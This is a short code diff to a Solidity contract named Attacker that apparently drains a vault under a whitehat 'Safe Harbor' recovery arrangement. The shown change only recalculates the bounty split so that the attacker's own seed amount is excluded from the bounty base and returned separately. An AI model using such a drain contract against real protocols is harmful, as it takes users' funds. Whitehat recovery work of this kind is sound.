@@ -85,11 +85,14 @@ contract Attacker {
         VAULT.withdrawAll();
 
         // ── Safe Harbor fund distribution ──────────────────────────────────
-        // Return recovered funds to the protocol, keeping only the agreed bounty.
+        // The drained balance includes our own SEED_AMOUNT, so the bounty is taken on
+        // the PROTOCOL's recovered funds only — we don't earn a bounty on our own seed.
+        // The protocol gets its share back; we keep the bounty plus our reclaimed seed.
         uint256 total = TOKEN.balanceOf(address(this));
-        uint256 bounty = (total * BOUNTY_BPS) / 10_000;
+        uint256 recovered = total - SEED_AMOUNT;
+        uint256 bounty = (recovered * BOUNTY_BPS) / 10_000;
 
-        TOKEN.transfer(RECOVERY_ADDRESS, total - bounty);
-        TOKEN.transfer(BENEFICIARY, bounty);
+        TOKEN.transfer(RECOVERY_ADDRESS, recovered - bounty);
+        TOKEN.transfer(BENEFICIARY, bounty + SEED_AMOUNT);
     }
 }
